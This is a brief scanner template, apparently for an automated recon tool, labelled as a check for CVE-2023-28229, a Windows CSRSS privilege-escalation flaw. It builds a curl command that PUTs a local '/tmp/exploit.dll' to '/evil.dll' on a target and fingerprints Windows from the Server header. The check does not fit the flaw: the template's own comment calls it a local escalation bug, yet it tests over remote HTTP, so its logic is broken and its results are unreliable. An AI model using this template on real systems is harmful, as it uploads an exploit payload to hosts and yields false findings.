AUTHOR='@xer0dayz'
VULN_NAME='CVE-2023-28229 - Windows CSRSS Elevation of Privilege'
URI="/evil.dll"
METHOD='PUT'
MATCH='200 OK'
SEVERITY='P2 - HIGH'
CURL_OPTS="--user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' -s --insecure -L -X PUT --data-binary @/tmp/exploit.dll"
SECONDARY_COMMANDS='''
# Check for Windows version
VERSION_CHECK=$(curl -s -I -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" http://$TARGET/ | grep -i '^server:' | grep -i 'windows')
if [ -n "$VERSION_CHECK" ]; then
    echo -e "\n[!] Windows system detected. Checking for vulnerable components..."
    echo "[*] This EoP affects Windows 10/11 and Windows Server 2016/2019/2022"
    echo "[*] Patch Tuesday April 2023 or later contains the fix"
fi
'''

# This local privilege escalation vulnerability exists in the Windows Client/Server Runtime Subsystem (CSRSS)
